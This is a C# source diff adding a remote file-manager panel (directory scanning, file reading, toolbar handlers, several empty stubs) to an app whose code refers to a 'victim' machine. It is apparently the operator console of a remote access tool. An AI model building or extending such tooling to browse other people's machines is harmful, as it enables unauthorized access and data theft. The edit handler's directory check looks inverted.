@@ -44,7 +44,43 @@ namespace Alien
             return true;
         }
 
-        TreeNode[] fnFileFindNodesWithText(TreeNodeCollection cNode, string szText)
+        #region Tool
+
+        private TreeNode fnFindNodeWithFullPath(TreeNodeCollection cNode, string szFullPath) => fnFindNodeWithFullPath(cNode, szFullPath.Replace("\\", "/").Split('/'));
+        private TreeNode fnFindNodeWithFullPath(TreeNodeCollection cNode, string[] asName, TreeNode rootNode = null)
+        {
+            if (asName.Length == 0)
+                return rootNode;
+
+            foreach (TreeNode node in cNode)
+            {
+                if (string.Equals(node.Text, asName[0]))
+                {
+                    return fnFindNodeWithFullPath(node.Nodes, asName[1..], node);
+                }
+            }
+
+            return null;
+        }
+        private clsfnFileMgr.stEntry fnFileGetItemTag(ListViewItem item) => (clsfnFileMgr.stEntry)item.Tag;
+
+        private T fnFindForm<T>() where T : Form
+        {
+            foreach (Form f in Application.OpenForms)
+            {
+                if (typeof(T).Name == f.GetType().Name)
+                {
+                    return (T)f;
+                }
+            }
+
+            return null;
+        }
+
+        #endregion
+        #region FileMgr
+
+        private TreeNode[] fnFileFindNodesWithText(TreeNodeCollection cNode, string szText)
         {
             List<TreeNode> lNode = new List<TreeNode>();
             foreach (TreeNode node in cNode)
@@ -78,23 +114,81 @@ namespace Alien
             fnFileAddPathToTreeView(asDirPath[1..], aNode[0]);
         }
 
-        TreeNode fnFindNodeWithFullPath(TreeNodeCollection cNode, string szFullPath) => fnFindNodeWithFullPath(cNode, szFullPath.Replace("\\", "/").Split('/'));
-        TreeNode fnFindNodeWithFullPath(TreeNodeCollection cNode, string[] asName, TreeNode rootNode = null)
+        async void fnFileScandir(string szDir)
         {
-            if (asName.Length == 0)
-                return rootNode;
+            listView2.Items.Clear();
+            textBox1.Text = szDir;
 
-            foreach (TreeNode node in cNode)
+            TreeNode node = fnFindNodeWithFullPath(treeView3.Nodes, szDir);
+
+            var le = await m_fileMgr.fnleScandir(szDir);
+            var leFolder = le.Where(x => x.bIsDirectory).ToList();
+            var leFile = le.Where(x => !x.bIsDirectory).ToList();
+
+            foreach (var entry in leFolder.Concat(leFile))
             {
-                if (string.Equals(node.Text, asName[0]))
-                    return fnFindNodeWithFullPath(node.Nodes, asName[1..], node);
+                ListViewItem item = new ListViewItem(entry.szEntryName);
+                item.SubItems.Add(entry.szPriviledge);
+                item.SubItems.Add(entry.nSize.ToString());
+                item.SubItems.Add(entry.dtCreationDate.ToString("F"));
+                item.SubItems.Add(entry.dtLastModifiedDate.ToString("F"));
+                item.SubItems.Add(entry.dtLastAccessedDate.ToString("F"));
+
+                string szExtension = entry.szEntryName.Split('.').Last();
+                if (!entry.bIsDirectory)
+                    m_fileMgr.fnGetExtensionIcon(szExtension);
+
+                item.ImageKey = entry.bIsDirectory ? "folder" : szExtension;
+
+                item.Tag = entry;
+
+                listView2.Items.Add(item);
+
+                if (entry.bIsDirectory && fnFindNodeWithFullPath(treeView3.Nodes, entry.szEntryPath) == null)
+                {
+                    node.Nodes.Add(entry.szEntryName);
+                }
             }
 
-            return rootNode;
+            node.Expand();
+
+            toolStripStatusLabel2.Text = $"Action successfully | Folder[{leFolder.Count}], File[{leFile.Count}]";
         }
+
+        async void fnFileRead(string szFilePath)
+        {
+            string szContent = await m_fileMgr.fnszRead(szFilePath);
+            frmTextEditor f = fnFindForm<frmTextEditor>();
+            if (f == null)
+                f = new frmTextEditor();
+
+            f.fnShowContent(szFilePath, szContent);
+        }
+
+        async void fnFileWrite(string szFilePath, string szContent)
+        {
+
+        }
+
+        async void fnFileUpload()
+        {
+
+        }
+
+        async void fnFileDownload()
+        {
+
+        }
+
+        #endregion
 
         async void fnSetup()
         {
+            treeView3.ImageList = fileImageList;
+            m_fileMgr.m_ExtIcon.Images.Add(fileImageList.Images["folder"]);
+            m_fileMgr.m_ExtIcon.Images.SetKeyName(m_fileMgr.m_ExtIcon.Images.Count - 1, "folder");
+            listView2.SmallImageList = m_fileMgr.m_ExtIcon;
+
             WebBrowser webBrowser = new WebBrowser();
             tabPage1.Controls.Add(webBrowser);
             webBrowser.Dock = DockStyle.Fill;
@@ -114,6 +208,7 @@ namespace Alien
                     foreach (string szName in fileInit.lsLogicalDrive)
                     {
                         TreeNode node = new TreeNode(szName);
+                        node.ImageKey = "harddrive";
                         treeView3.Nodes.Add(node);
                     }
 
@@ -141,7 +236,61 @@ namespace Alien
 
         private void treeView3_AfterSelect(object sender, TreeViewEventArgs e)
         {
-            var le = m_fileMgr.fnleScandir(treeView3.SelectedNode.FullPath);
+            toolStripStatusLabel2.Text = "Loading...";
+
+            TreeNode node = treeView3.SelectedNode;
+            string szDir = node.Parent == null && !m_victim.m_bUnixLike ? node.FullPath + "\\" : node.FullPath;
+            fnFileScandir(szDir);
+        }
+
+        //File.Parent
+        private void toolStripButton1_Click(object sender, EventArgs e)
+        {
+            TreeNode node = fnFindNodeWithFullPath(treeView3.Nodes, m_fileMgr.m_szCurrentPath);
+            if (node != null && node.Parent != null)
+                treeView3.SelectedNode = node;
+        }
+        //File.Home
+        private void toolStripButton2_Click(object sender, EventArgs e)
+        {
+            TreeNode node = fnFindNodeWithFullPath(treeView3.Nodes, m_fileMgr.m_szHomePath);
+            if (node != null)
+                treeView3.SelectedNode = node;
+        }
+        //File.Edit
+        private void toolStripMenuItem2_Click(object sender, EventArgs e)
+        {
+            foreach (ListViewItem item in listView2.SelectedItems)
+            {
+                var stEntry = fnFileGetItemTag(item);
+                if (stEntry.bIsDirectory)
+                    fnFileRead(stEntry.szEntryPath);
+            }
+        }
+        //File.Copy
+        private void toolStripMenuItem3_Click(object sender, EventArgs e)
+        {
+
+        }
+        //File.Cut
+        private void toolStripMenuItem4_Click(object sender, EventArgs e)
+        {
+
+        }
+        //File.Paste
+        private void toolStripMenuItem5_Click(object sender, EventArgs e)
+        {
+
+        }
+        //File.Image.ShowAll
+        private void toolStripMenuItem6_Click(object sender, EventArgs e)
+        {
+
+        }
+        //File.Image.ShowSelected
+        private void toolStripMenuItem7_Click(object sender, EventArgs e)
+        {
+
         }
     }
 }
